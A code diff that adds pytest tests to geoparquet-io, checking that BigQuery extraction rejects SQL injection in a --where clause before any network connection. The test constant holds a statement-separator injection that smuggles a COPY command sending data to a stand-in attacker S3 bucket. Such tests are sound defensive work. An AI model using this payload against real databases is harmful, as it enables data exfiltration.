@@ -473,6 +473,58 @@ class TestDryRun:
         assert result is None
 
 
+class TestWhereClauseValidation:
+    """--where must be routed through validate_where_clause (gpio #612 parity).
+
+    A statement-separator injection must be rejected before any network call,
+    on both the dry-run path and the real (non-dry-run) path.
+    """
+
+    INJECTION_WHERE = "1=1); COPY (SELECT 1) TO 's3://attacker/x'; --"
+
+    def test_dry_run_rejects_semicolon_injection(self):
+        """Dry-run must reject a ';' statement separator before printing SQL."""
+        from geoparquet_io.core.exceptions import ValidationError
+        from geoparquet_io.core.extract_bigquery import extract_bigquery
+
+        with pytest.raises(ValidationError):
+            extract_bigquery(
+                table_id="project.dataset.table",
+                dry_run=True,
+                where=self.INJECTION_WHERE,
+            )
+
+    def test_dry_run_allows_legitimate_where(self):
+        """A legitimate --where does not raise on the dry-run path."""
+        from geoparquet_io.core.extract_bigquery import extract_bigquery
+
+        result = extract_bigquery(
+            table_id="project.dataset.table",
+            dry_run=True,
+            where="population > 1000",
+        )
+        assert result is None
+
+    @patch("geoparquet_io.core.extract_bigquery._setup_bigquery_connection")
+    def test_real_path_rejects_injection_before_network(self, mock_setup):
+        """Non-dry-run path must validate before establishing a BigQuery connection."""
+        from geoparquet_io.core.exceptions import ValidationError
+        from geoparquet_io.core.extract_bigquery import extract_bigquery
+
+        mock_setup.side_effect = AssertionError(
+            "network connection attempted before where-clause validation"
+        )
+
+        with pytest.raises(ValidationError):
+            extract_bigquery(
+                table_id="project.dataset.table",
+                dry_run=False,
+                where=self.INJECTION_WHERE,
+            )
+
+        mock_setup.assert_not_called()
+
+
 class TestPythonAPI:
     """Test the Python API for BigQuery."""
 
